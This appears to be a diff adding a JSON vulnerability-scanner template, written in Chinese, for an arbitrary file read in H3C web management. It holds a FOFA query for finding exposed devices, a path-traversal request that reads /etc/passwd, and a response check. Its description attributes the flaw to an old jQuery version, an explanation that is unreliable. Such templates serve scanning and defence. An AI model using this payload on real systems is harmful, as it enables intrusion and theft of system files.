@@ -1,0 +1,35 @@
+{
+  "product": "H3C",
+  "vul_name": "H3C Web网管登录任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "jquery旧版本存在任意文件读取漏洞，允许攻击者在受害者的服务器上读取任意文件。H3CWeb网管部分使用过时的jquery版本导致存在任意文件读取漏洞。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/webui/js/jquerylib/jquery-1.7.2.min.js\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_37113223/article/details/136151552",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "root:"
+        }
+      ]
+    }
+  }
+}
